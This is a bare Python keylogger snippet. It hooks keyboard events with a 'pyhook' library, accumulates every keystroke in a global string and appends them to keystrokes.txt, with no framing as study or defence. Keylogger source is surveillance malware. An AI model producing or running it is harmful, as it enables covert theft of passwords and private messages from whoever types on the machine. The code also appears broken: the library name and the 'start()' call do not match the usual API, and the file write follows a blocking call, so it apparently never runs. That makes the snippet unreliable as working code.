import pyhook

def onKeyboardEvent(event):
    global keystrokes
    keystrokes += event.Key
    return True

keystrokes = ""
hm = pyhook.HookManager()
hm.KeyDown = onKeyboardEvent
hm.HookKeyboard()
hm.start()

with open("keystrokes.txt", "a") as f:
    f.write(keystrokes)
